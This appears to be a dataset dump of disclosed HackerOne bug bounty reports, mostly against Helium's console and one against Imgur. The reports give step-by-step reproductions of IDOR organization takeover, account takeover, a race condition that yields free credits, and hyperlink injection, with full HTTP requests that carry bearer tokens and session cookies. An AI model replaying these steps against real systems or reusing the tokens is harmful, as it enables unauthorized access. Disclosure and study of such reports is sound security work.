Result: You've successfully achieved an account takeover. In the future, you'll be able to log in again with this technique in the future, but a victim will have trouble logging in because of 2FA.
Impact
If a victim's account ID is known, we can fully takeover an account without user interaction. User ID could be disclosed at https://console.helium.com/users (if our user role has access to this directory) or by using other techniques.1 attachment:F737179: x0ul4.pngw2w   changed the report title from Account takeover w/o interaction for user that don't have 2fa enabled via 2fa linking and improper auth at /api/2fa/verify to Account takeover w/o interaction for a user that doesn't have 2fa enabled via 2fa linking and improper auth at /api/2fa/verify. Mar 4th (3 years ago)coco-helium Helium staff  updated the severity from high to medium. Mar 10th (3 years ago)coco-helium Helium staff  changed the status to Triaged. Mar 10th (3 years ago)without the user ID, this vulnerability will be difficult to execute. changing severity to medium. thanks for your report.Helium  rewarded w2w with a $100 bounty. Mar 10th (3 years ago)victormu Helium staff  closed the report and changed the status to Resolved. Apr 27th (3 years ago)w2w   requested to disclose this report. Jun 26th (2 years ago)Hi @coco-helium @victormu, can we disclosure this one? I'm going through the list of my reports to find ones that suitable for disclosing.
Also, could you please delete 1st and 2nd screenshots? They are disclosing my bearer token which could be not expired and it allows access to my test account.  This report has been disclosed. Jul 26th (2 years ago)",https://hackerone.com/reports/810880,California,United States,San Francisco,2020,3,4,16,47
Helium,101-250,0.0,1m-10m,$100.00,Medium,5.45,Cleartext Transmission of Sensitive Information,Cleartext Transmission of Sensitive Information Leads to administrator access,"kdr9666  submitted a report to Helium.Mar 8th (3 years ago)The weakness of the program is Cleartext Transmission of Sensitive Information through URL Leads to administrator access. This program is having one feature like we can add users like administrator and read-only, these are roles, into organizations. Here I get the administrator role at same organization by removing the original user id.
Vulnerable URL:  https%3A%2F%2Fconsole.helium.com%2Fusers
Steps to Reproduce:

After creating the account for your organization, go to the Users tab and here you can see your organization name on the top, now try to add a user by using the mail id with the role of the administration.
Then the opposite user will receive the invitation link from the first user, Click on the invitation link it will take you into the registration page of Console.helium.com, but here thing is, just go to URL of current page here you can see the organization name, inviter id and also invite receiver id and change the mail id of receiver and click on enter.
Now, you able to see the registration page again with different mail id in the field of the username and create a password for this id and click on the Register button.
Now, this last mail id will receive a confirmation link to complete the registration process, for this go to the mailbox and click on the link and after trying to log in.
After a successful login to the account, you can see the organization name of the inviter. Now you are also one the administrator of this organization.
To confirm this, go to a first user account who invited into the administrator role, here you can able see the mail id of the last user instead of the real one.
Yes… we have successfully done it.

Impact
Full administrator account take over.
Severity:
Critical12 attachments:F741101: Pic1.pngF741102: Pic2.pngF741103: Pic3.pngF741104: Pic4.pngF741105: Pic5.pngF741106: Pic6.pngF741107: Pic7.pngF741108: Pic8.pngF741109: Pic9.pngF741110: Pic10.pngF741112: Pic11.pngF741114: HELIUM.mp4",https://hackerone.com/reports/813159,California,United States,San Francisco,2020,3,8,13,50
Helium,101-250,0.0,1m-10m,$100.00,Medium,5.45,Insecure Direct Object Reference (IDOR),Organization Takeover via invitation API,"azraelsec  submitted a report to Helium.Mar 31st (3 years ago)Hello @helium,
today I would like to show you how a malicious user could exploit an IDOR affecting the /invitations resource to gain Administrator privileges inside an organization of which he's part of as a reader.
Steps to reproduce the bug
Setup
Let's assume that three accounts exist:

azraelsec@wearehackerone.com [Attacker]
azraelsec+test@wearehackerone.com [Victim]
azraelsec+1@wearehackerone.com [Attacker's fake account]

Initial Context: [Victim] is Administrator of the target organization on Helium Console and invites [Attacker] to join it as a reader.
Goal: [Attacker] escalate its privileges and becomes Administrator of the target organization
Attack
1) [Attacker] makes a graphql query to leak the organization's id (using graphql it's only possible to see the memberships of the current organization):
Code 2.17 KiBWrap lines Copy Download1POST /graphql HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 469
5accept: */*
6Sec-Fetch-Dest: empty
7authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
9content-type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/dashboard
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; __cfduid=dfe09d09943b9f82399b493143e78867f1585613806; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI4ZjVhYmUxOS0wMDAxLTQxYjUtYTk2OS1mZTBiNzFkY2NmMWYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODU2MTM4MDkxNzMsImxhc3RFdmVudFRpbWUiOjE1ODU2MTY4NjQwNDMsImV2ZW50SWQiOjU2MywiaWRlbnRpZnlJZCI6MTEwLCJzZXF1ZW5jZU51bWJlciI6NjczfQ==
17
18{""operationName"":""PaginatedOrganizationsQuery"",""variables"":{""page"":1,""pageSize"":10},""query"":""query PaginatedOrganizationsQuery($page: Int, $pageSize: Int) {\n  organizations(page: $page, pageSize: $pageSize) {\n    entries {\n      ...OrganizationFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment OrganizationFragment on Organization {\n  id\n  name\n  inserted_at\n  __typename\n}\n""}
Code 818 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Date: Tue, 31 Mar 2020 01:07:44 GMT
3Content-Type: application/json; charset=utf-8
4Connection: close
5Cache-Control: max-age=0, private, must-revalidate
6Strict-Transport-Security: max-age=31536000
7Via: 1.1 vegur
8CF-Cache-Status: DYNAMIC
9Expect-CT: max-age=604800, report-uri=""https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct""
10Server: cloudflare
11CF-RAY: 57c62cdb39b0be28-MXP
12Content-Length: 401
13
14{""data"":{""organizations"":{""__typename"":""PaginatedOrganizations"",""entries"":[{""__typename"":""Organization"",""id"":""883b0a46-e4cf-4315-af4f-4226d1ada561"",""inserted_at"":""2020-03-31T00:58:34"",""name"":""lol""},{""__typename"":""Organization"",""id"":""cb23000e-65b3-4628-9ede-656ffa0d5aa8"",""inserted_at"":""2020-03-31T01:05:42"",""name"":""target""}],""pageNumber"":null,""pageSize"":null,""totalEntries"":null,""totalPages"":null}}}
NOTE: the target organization's id is cb23000e-65b3-4628-9ede-656ffa0d5aa8
2) Using its own organization's page [Attacker] makes a request to the /api/invitations end-point in order to add [Attacker's fake account] to it in the role of admin and intercepts this request through Burp Suite. It looks like this:
Code 1.87 KiBWrap lines Copy Download1POST /api/invitations HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 125
5Accept: application/json, text/plain, */*
6Sec-Fetch-Dest: empty
7Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
9Content-Type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/users
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; __cfduid=dfe09d09943b9f82399b493143e78867f1585613806; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI4ZjVhYmUxOS0wMDAxLTQxYjUtYTk2OS1mZTBiNzFkY2NmMWYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODU2MTM4MDkxNzMsImxhc3RFdmVudFRpbWUiOjE1ODU2MTY4OTQ2OTYsImV2ZW50SWQiOjU2NiwiaWRlbnRpZnlJZCI6MTEwLCJzZXF1ZW5jZU51bWJlciI6Njc2fQ==
17
18{""invitation"":{""email"":""azraelsec+1@wearehackerone.com"",""role"":""admin"",""organization"":""883b0a46-e4cf-4315-af4f-4226d1ada561""}}
3) [Attacker] now only needs to change the organization field's value inserting the target one:
Code 1.87 KiBWrap lines Copy Download1POST /api/invitations HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 126
5Accept: application/json, text/plain, */*
6Sec-Fetch-Dest: empty
7Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
9Content-Type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/users
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; __cfduid=dfe09d09943b9f82399b493143e78867f1585613806; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI4ZjVhYmUxOS0wMDAxLTQxYjUtYTk2OS1mZTBiNzFkY2NmMWYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODU2MTM4MDkxNzMsImxhc3RFdmVudFRpbWUiOjE1ODU2MTY4OTQ2OTYsImV2ZW50SWQiOjU2NiwiaWRlbnRpZnlJZCI6MTEwLCJzZXF1ZW5jZU51bWJlciI6Njc2fQ==
17
18{""invitation"":{""email"":""azraelsec+1@wearehackerone.com"",""role"":""admin"",""organization"":""cb23000e-65b3-4628-9ede-656ffa0d5aa8""}}
Code 575 BytesWrap lines Copy Download1HTTP/1.1 201 Created
2Date: Tue, 31 Mar 2020 01:08:59 GMT
3Content-Type: application/json; charset=utf-8
4Content-Length: 115
5Connection: close
6Cache-Control: max-age=0, private, must-revalidate
7Message: User added to organization
8Strict-Transport-Security: max-age=31536000
9Via: 1.1 vegur
10CF-Cache-Status: DYNAMIC
11Expect-CT: max-age=604800, report-uri=""https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct""
12Server: cloudflare
13CF-RAY: 57c62eaa4ccde903-MXP
14
15{""id"":""a0262e0c-7939-42dd-a4ec-e42dc2eeaeab"",""joined_at"":""2020-03-31T01:08:59"",""role"":""admin"",""type"":""memberships""}
4) Now [Attacker's fake account] has got full privileges on the target organization and can properly change [Attacker]'s role to Administrator and he can delete the original owner.
Mitigations
To be sure that the requesting user is an Administrator of that organization is enough to solve this issue.
Impact
This vulnerability has got a great impact on the platform as it allows any user to gain Administrator privileges on organizations he's part of, full controlling it.1 attachment:F766868: Organization_Takeover_via_Invitations.mp4",https://hackerone.com/reports/835005,California,United States,San Francisco,2020,3,31,2,5
Helium,101-250,0.0,1m-10m,$50.00,Low,2.0,Open Redirect,Hyperlink Injection on Email Invitation,"eissen5c  submitted a report to Helium.Apr 8th (3 years ago)DESCRIPTION
Found an hyperlink injection of the name of Organization when the attacker invites the victim to his organization with injection hyperlink.
STEPS

Add organization with the name of https://attacker.com and switch it.
Go to user and invite the victim using email.
victim will seee the invitation with malicious link

POC IMAGE

Add organization name as https://attacker.com

Image F779678: 1.JPG 36.98 KiBZoom in Zoom out Copy Download

Go to user and invite someone and the victim will see the invitation

Image F779676: 2.JPG 43.79 KiBZoom in Zoom out Copy Download

accepted invitation for already registered

Image F779677: 3.JPG 27.34 KiBZoom in Zoom out Copy Download
Impact
Open Redirect from hyperlink injection to malicious website.3 attachments:F779676: 2.JPGF779677: 3.JPGF779678: 1.JPGcoco-helium Helium staff  updated the severity from medium to low. Apr 13th (3 years ago)Helium  rewarded eissen5c with a $50 bounty. Apr 13th (3 years ago)Thanks for your report. This is a valid vulnerability and we'll be sanitizing org names.coco-helium Helium staff  changed the status to Triaged. Apr 13th (3 years ago)victormu Helium staff  closed the report and changed the status to Resolved. Apr 27th (3 years ago)eissen5c   requested to disclose this report. Oct 25th (2 years ago)Limited Disclosure :)  This report has been disclosed. Nov 24th (2 years ago)",https://hackerone.com/reports/843421,California,United States,San Francisco,2020,4,8,17,57
Helium,101-250,0.0,1m-10m,$50.00,High,7.95,Insecure Direct Object Reference (IDOR),Read-Only user can delete users,"amr_  submitted a report to Helium.Jun 1st (2 years ago)hello
this endpoint (DELETE /api/invitations/0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8 )vulnerable  to Insecure Direct Object Reference
Steps to reproduce the bug
Let's assume that three accounts exist:
admin@helium.com        (role Administrator)
attacker@helium.com   (role Read-Only)
victim@helium.com        (invited user )
all three account in same organization (h1)
attacker@helium.com cant delete victim@helium.com but we can do that
from admin@helium.com go to delete victim@helium.com
request like that DELETE /api/invitations/0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8
take id victim@helium.com 0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8
go to attacker@helium.com switch another organization (h2)
and go to delete invited user from this organization(h2)
DELETE /api/invitations/a996881d-7177-43fb-be7c-da3a6b005f40
change id (a996881d-7177-43fb-be7c-da3a6b005f40) to id you got from admin@helium.com(0ff7e9f9-877a-40cc-b99f-f6b3b1bea3f8)
respond
HTTP/1.1 204 No Content
Date: Mon, 01 Jun 2020 18:47:43 GMT
Content-Length: 0
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Message: User removed from organization
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur
CF-Cache-Status: DYNAMIC
cf-request-id: 0312cf14d40000edeb299e9200000001
Expect-CT: max-age=604800, report-uri=""https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct""
Server: cloudflare
CF-RAY: 59cb1ace2eeaedeb-CDG
now account victim@helium.com deleted from attacker@helium.com
i can make poc
thanks
Impact
Read-Only user can delete users",https://hackerone.com/reports/888729,California,United States,San Francisco,2020,6,1,19,8
Helium,101-250,0.0,1m-10m,$250.00,Medium,5.45,Business Logic Errors,Race Condition of Transfer data Credits to Organization Leads to Add Extra free Data Credits to the Organization,"eissen5c  submitted a report to Helium.Sep 4th (2 years ago)Description
i found an way to add data credits for free by doing race condition of transfering data credits using turbo intruder of burpsuite
when created an account with only default 10000 data credits but i managed it to add for free without buying or purchasing 
POC Steps (if Confused refer POC Video)

Create two Org A and B
Go to Data Credits of that have balance of 10000
Before Making Transfer make sure the burp suite is intercept on 
then click transfer and make sure you see the HTTP Request of ""https://console.helium.com/api/data_credits/transfer_dc"" in popup example below

Code 2.86 KiBWrap lines Copy Download1POST /api/data_credits/transfer_dc HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 66
5Accept: application/json, text/plain, */*
6Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IndsbXNzZUJDY01oSjdpQ3RjZ2wyeiJ9.eyJuaWNrbmFtZSI6ImVpc3NlbjVjKzIiLCJuYW1lIjoiZWlzc2VuNWMrMkB3ZWFyZWhhY2tlcm9uZS5jb20iLCJwaWN0dXJlIjoiaHR0cHM6Ly9zLmdyYXZhdGFyLmNvbS9hdmF0YXIvM2E1YTY3MjhlODkyN2YxYTgxYmJiZWQzY2I0MGI2OWI_cz00ODAmcj1wZyZkPWh0dHBzJTNBJTJGJTJGY2RuLmF1dGgwLmNvbSUyRmF2YXRhcnMlMkZlaS5wbmciLCJ1cGRhdGVkX2F0IjoiMjAyMC0wOS0wNFQxNzo1NDowNy4xMjFaIiwiZW1haWwiOiJlaXNzZW41YysyQHdlYXJlaGFja2Vyb25lLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJpc3MiOiJodHRwczovL2F1dGguaGVsaXVtLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZjUyN2YwYTMzYzBhMjAwNmQ1OTJjNDkiLCJhdWQiOiJiSGx0N043MEhPVHFZSkJ2R2NvbjFsQVJGcDc4WFczMyIsImlhdCI6MTU5OTI0MjI0NCwiZXhwIjoxNTk5Mjc4MjQ0LCJub25jZSI6InJhQ25sSE1kM1o4cERManNORUt0Rk80R2ZBZlRkUDdfUkIyWXRGNTB4MlcifQ.LdiVe8woYQ9nKky6s9x0AdcH75gf0lrSqO9wWhTW6aD38VDesRgZQZcopvKWwltdv0g6cfd0qSc0NOXSTJU-YCxnM_SmTwQdzz_w7t3tdj4H4NPMgxvk7Wi0Q0Ot5gnBFy-Hs43kNq_6JgON2fdOd3ANxTPyKo10sp_z_9I6XoPydUKl0vWOqCAAtqWY09yKnsAcUOiKAvwlToyRPpyzb0CiB2CkITgXRpq5I5dkx0MSikgfOtbMgHwXIwyR4221VaU9quZ21gHCj5h_b-eS5ZDK8c5lqrjheNHv0hSSquDOUJ-PJuZIXmdzthC4nDNUXFr56h5yBxdwvz14mF-xIQ
7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
8organization: 9eda512e-7d7b-4884-95a1-05289cd0986f
9Content-Type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Sec-Fetch-Dest: empty
14Referer: https://console.helium.com/datacredits/
15Accept-Encoding: gzip, deflate
16Accept-Language: en-US,en;q=0.9
17Cookie: __cfduid=d6c96a4a7e23c1a9288364ad41fe940441598519944; __stripe_mid=38940331-8c51-426f-9677-d823149a19c5e78eb8; intercom-id-uj330shp=8a7342fa-569f-458d-8a48-99a7d7b04ce8; intercom-session-uj330shp=; _ga=GA1.2.619170841.1599241231; _gid=GA1.2.1901543145.1599241231; ajs_anonymous_id=%22b9db00a3-41f6-494d-a4a5-7d536b460f69%22; _fbp=fb.1.1599241231521.572784627; a0.spajs.txs.bmJZUTBDWEJvVVJZWTQ1eE8xNmp2NWRLMWVmfi5UNFZ0bUxNWDYyQ3g0cA%3D%3D={%22nonce%22:%22SJi.KgEbopUDCs8F2D0kIH88ijdqst6UStDRbHkTLra%22%2C%22code_verifier%22:%22RlDt9XH2A5lQhpXebqa1eK5V1-jM_0bvJq-IsIWDWQ5%22%2C%22appState%22:{%22targetUrl%22:%22/%22%2C%22params%22:%22%22}%2C%22scope%22:%22openid%20profile%20email%22%2C%22audience%22:%22default%22%2C%22redirect_uri%22:%22https://console.helium.com%22}; __stripe_sid=caa82502-18e1-4d95-adc4-af3a7c1c238ef69a16; auth0.is.authenticated=true; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjUzMDMzZDY4LTc1NTMtNDhmNC05YmY5LWQ0NDZhOTE1NWUyZFIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5OTI0MTMxOTIyMywibGFzdEV2ZW50VGltZSI6MTU5OTI0MjIxOTg3NywiZXZlbnRJZCI6NTYsImlkZW50aWZ5SWQiOjI0LCJzZXF1ZW5jZU51bWJlciI6ODB9
18
19{""countDC"":""10000"",""orgId"":""51e43268-248d-430d-8f3a-8a9de94bdcc9""}

Send it to Turbo Intruder and Select Race.py Script
Go Boom execute and refresh the balance

POC Image
Race Condition

Image F976455: POC1.PNG 82.58 KiBZoom in Zoom out Copy Download

Race Condition

Image F976456: POC2.PNG 79.80 KiBZoom in Zoom out Copy Download

Data Credit History

Image F976463: POC3.PNG 53.38 KiBZoom in Zoom out Copy Download

Organization View with Data Credit Balance

Image F976465: POC4.PNG 18.65 KiBZoom in Zoom out Copy Download

Email Notification

Image F976469: POC5.PNG 7.57 KiBZoom in Zoom out Copy Download

POC Video (PS . i uploaded on dropbox due to slow internet connection and problems uploading to hackerone directly sorry about that)
https://www.dropbox.com/s/8xuipexpiyz7lp3/2020-09-05%2002-02-41.mkv?dl=0
Impact
Abusing the Race Condition inorder to add extra free data Credits to the organization without buying and lead to business impact5 attachments:F976455: POC1.PNGF976456: POC2.PNGF976463: POC3.PNGF976465: POC4.PNGF976469: POC5.PNGeissen5c   posted a comment. Sep 14th (2 years ago)any updates??victormu Helium staff  updated the severity from high to medium. Sep 14th (2 years ago)victormu Helium staff  changed the status to Triaged. Sep 14th (2 years ago)eissen5c   posted a comment. Sep 21st (2 years ago)any updates?eissen5c   posted a comment. Oct 3rd (2 years ago)any updates?Helium  rewarded eissen5c with a $250 bounty. Oct 12th (2 years ago)Thanks for submitting the report.heliumsecurity Helium staff  changed the status to Triaged. Oct 12th (2 years ago)eissen5c   posted a comment. Oct 28th (2 years ago)any updates for this report?jdgemm Helium staff  closed the report and changed the status to Resolved. Oct 28th (2 years ago)Thank you, a bounty was paid out 10/12 and issue has been addressed.eissen5c   requested to disclose this report. Oct 28th (2 years ago)thanks for update can disclose?  This report has been disclosed. Nov 27th (2 years ago)Summary by eissen5cPOC VIDEO :
https://www.youtube.com/watch?v=iDg6x9kXO9c",https://hackerone.com/reports/974892,California,United States,San Francisco,2020,9,4,18,32
Helium,101-250,0.0,1m-10m,$100.00,Medium,5.45,Privilege Escalation,Read-only user can delete higher privileged members using open DELETE /api/memberships/<membershipID> endpoint,"chipped  submitted a report to Helium.Mar 4th (3 years ago)Summary
The /api/memberships/membershipID endpoint on console.helium.com is open to anyone, including read-only users in an organization. This means that a read-only member can kick a manager, administrator, or even the owner out of an organization using this vulnerability. 
Steps to Reproduce:

Create two accounts, user 1 (admin), user 2 (read-only member) with any organization name
You should already have the orgs set up, so for user 1, head over to the Users tab on the left
Click Add User on the right
Enter user 2's email (make sure their permission is read-only) and submit
Log in to user 2
Click Switch next to user 1's organization (should be at the home page)
Turn on burp or any proxy and start intercepting
Click on users on the left
Look for the GraphQL request with the operation name of PaginatedMembershipsQuery, this will list all memberships in that organization (including the ID, which is what we're looking for) Image F736503: POC1.png 30.61 KiBZoom in Zoom out Copy Download
Look for user 1's email and store the membership ID (id)
Now go to user 2 and switch back to their organization and add user 1 to that org (perms don't matter)
This will instantly add them to the user list without an invite
Start intercepting and delete them from the user list
Send the DELETE /api/memberships/id to repeater
Now put the membership ID you stored earlier and replace it with the current ID, this should then delete the membership Image F736504: POC2.png 37.29 KiBZoom in Zoom out Copy Download
Refresh the page for user 1, it will actually log them out as well with a 401 of You don't have access to this organization

This will remove any user from the organization. This is particularly dangerous if you want to take over an organization, except the only thing you can do is kick users out, the rest is still read-only. This is also possible for managers, they can remove administrators, which is more impactful since managers actually have permission within the org. So as a result, administrators wouldn't be able to supervise the hacker and he would have complete control over the organization.
Impact
You can kick any user you want from an organization as long as you are a member.2 attachments:F736503: POC1.pngF736504: POC2.pngchipped   posted a comment. Mar 4th (3 years ago)It looks like the user doesn't even have to be in the organization. All they need is the membership ID and they can delete it.
Here's an example org, the attacker is chipped+poc2@wearehackerone.com who is not a part of the organization:
Image F737390: POCONE.png 37.29 KiBZoom in Zoom out Copy Download
This is chipped+poc2 making a DELETE request with the membership ID of chipped+poc1 who is an administrator in the org:
Image F737391: POCTWO.png 34.61 KiBZoom in Zoom out Copy Download
This is the final user list on refresh:
Image F737383: POCTHREE.png 28.38 KiBZoom in Zoom out Copy Download3 attachments:F737383: POCTHREE.pngF737390: POCONE.pngF737391: POCTWO.pngcoco-helium Helium staff  updated the severity from high to medium. Mar 10th (3 years ago)coco-helium Helium staff  changed the status to Triaged. Mar 10th (3 years ago)Helium  rewarded chipped with a $100 bounty. Mar 16th (3 years ago)chipped   posted a comment. Mar 16th (3 years ago)Thank you!victormu Helium staff  closed the report and changed the status to Resolved. Apr 27th (3 years ago)chipped   requested to disclose this report. May 30th (2 years ago)Would love to disclose this.  This report has been disclosed. Jun 29th (2 years ago)",https://hackerone.com/reports/810320,California,United States,San Francisco,2020,3,4,4,37
Helium,101-250,0.0,1m-10m,$50.00,High,7.95,None,unpermitted user can change the device name of admin account,"error___404  submitted a report to Helium.May 3rd (3 years ago)Invited user with only the read-only permission can change the device name in admin account
1.create two account 'A 'and 'B ' in  console.helium
2.Invited the account 'B' with 'A' by giving the read-only permission
3.In account 'B' trying to delete the organization created by admin account 'A' and intercept the request then you got the organization id in request
4.Then in account 'B' add the device name and click on it and update the name which you want to display in the admin account(victim account)
5.And intercept the request while clicking the update button
6.In the request add the organization id which you got in step 3
7.then forward the request then the device name in admin account will be changed
Impact
attacker with only the read-only permission can change the device name in the admin account1 attachment:F812936: helium_poc_.mp4",https://hackerone.com/reports/865115,California,United States,San Francisco,2020,5,3,6,50
Imgur,51-100,0.0,10m-50m,$50.00,No value,0.0,Cryptographic Issues - Generic,Big Bug in SSL : breach compression attack (CVE-2013-3587) affect imgur.com,"hacker00000000  submitted a report to Imgur.Jan 19th (7 years ago)Hi imgur Security Team,
This is an urgent issue and wish you fix it as soon as possible ...
so this web application "" imgur.com "" "" is potentially vulnerable to the BREACH attack.
An attacker with the ability to:
Inject partial chosen plaintext into a victim's requests
Measure the size of encrypted traffic
can leverage information leaked by compression to recover targeted parts of the plaintext.
BREACH (Browser Reconnaissance & Exfiltration via Adaptive Compression of Hypertext) is a category of vulnerabilities and not a specific instance affecting a specific piece of software. To be vulnerable, a web application must:
Be served from a server that uses HTTP-level compression
Reflect user-input in HTTP response bodies
Reflect a secret (such as a CSRF token) in HTTP response bodies
URL: /signin/
Attack details
This alert was issued because the following conditions were met:
The page content is served via HTTPS
The server is using HTTP-level compression
URL encoded GET input redirect was reflected into the HTTP response body.
HTTP response body contains a secret named csrf
The impact of this vulnerability
An attacker can leverage information leaked by compression to recover targeted parts of the plaintext.
